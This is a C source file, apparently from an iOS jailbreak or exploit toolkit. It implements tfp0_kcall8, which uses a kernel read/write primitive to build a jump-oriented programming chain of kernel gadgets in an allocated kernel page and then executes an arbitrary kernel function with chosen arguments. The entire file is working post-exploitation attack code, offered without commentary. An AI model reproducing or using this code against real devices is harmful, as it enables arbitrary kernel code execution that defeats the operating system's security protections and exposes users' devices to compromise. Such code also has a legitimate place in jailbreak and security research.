#include "offsets.h"
#include "tfp0_krw.h"
#include "kexecute.h"

uint64_t tfp0_kcall8(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    uint64_t kpage = tfp0_kalloc(0x1000);

    tfp0_kwrite64(kpage, kpage);
    tfp0_kwrite64(kpage + 0x98, kpage);
    tfp0_kwrite64(kpage + 0x7c0, kgad(KGADGET_POPULATE) + 4);

    tfp0_kwrite64(kpage + 0x100, 0);
    tfp0_kwrite64(kpage + 0x108, 0);
    tfp0_kwrite64(kpage + 0x110, kpage + 0x800);  
    tfp0_kwrite64(kpage + 0x118, x7);               
    tfp0_kwrite64(kpage + 0x120, kgad(KGADGET_POPULATE)); 

    uint64_t current_kpage = kpage + 0x800;
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X12_X0__BR_x2));
    tfp0_kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE)); 
    tfp0_kwrite64(current_kpage + 0x10, current_kpage + 0x40);     
    tfp0_kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));     
    tfp0_kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40;
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X10_X0__BR_X2));
    tfp0_kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));     
    tfp0_kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    tfp0_kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));     
    tfp0_kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X16_X15__BR_X12));
    tfp0_kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));     
    tfp0_kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    tfp0_kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));     
    tfp0_kwrite64(current_kpage + 0x20, 0);
    //x7 is now jop's x7

    current_kpage += 0x40; 
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X7_X16__BR_X10));
    tfp0_kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));     
    tfp0_kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    tfp0_kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));
    tfp0_kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X10_X0__BR_X12));
    tfp0_kwrite64(current_kpage + 0x8, x4);     
    tfp0_kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    tfp0_kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));
    tfp0_kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X13_X2__BR_X12));
    tfp0_kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));
    tfp0_kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    tfp0_kwrite64(current_kpage + 0x18, x4);
    tfp0_kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X15_X2__BR_X3));
    tfp0_kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));
    tfp0_kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    tfp0_kwrite64(current_kpage + 0x18, addr);
    tfp0_kwrite64(current_kpage + 0x20, kgad(KGADGET_POPULATE));

    current_kpage += 0x40; 
    tfp0_kwrite64(current_kpage, kgad(KGADGET_MOV_X4_X13__BR_X15));
    tfp0_kwrite64(current_kpage + 0x8, x0);
    tfp0_kwrite64(current_kpage + 0x10, x1);
    tfp0_kwrite64(current_kpage + 0x18, x2);
    tfp0_kwrite64(current_kpage + 0x20, x3);

    uint64_t STORED_RET = kpage + 0x100;
    kexecute(kgad(KGADGET_PROLOGUE), kpage, STORED_RET, 0, 0, kgad(KGADGET_MOV_X15_X2__BR_X3), x5, x6);
    return tfp0_kread64(STORED_RET);
}